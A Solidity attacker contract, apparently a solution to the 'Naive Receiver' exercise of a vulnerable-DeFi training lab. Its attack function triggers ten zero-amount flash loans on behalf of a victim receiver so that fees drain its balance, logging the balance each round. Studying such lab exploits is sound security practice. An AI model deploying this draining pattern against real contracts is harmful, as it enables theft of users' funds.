// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract NaiveReceiverAttacker {

  address immutable target;
  address immutable pool;

  constructor(address _target, address _pool) {
    target = _target;
    pool = _pool;
  }

  function attack() external {
    bool success;
    uint256 targetBalance = address(target).balance;
    for(uint8 i = 0; i < 10; i++) {
      console.log("old targetBalance", targetBalance);
      (success, ) = pool.call(abi.encodeWithSignature("flashLoan(address,uint256)", target, 0));
      require(success, "call failed");
      targetBalance = address(target).balance;
      console.log("new targetBalance", targetBalance);
    }
  }
}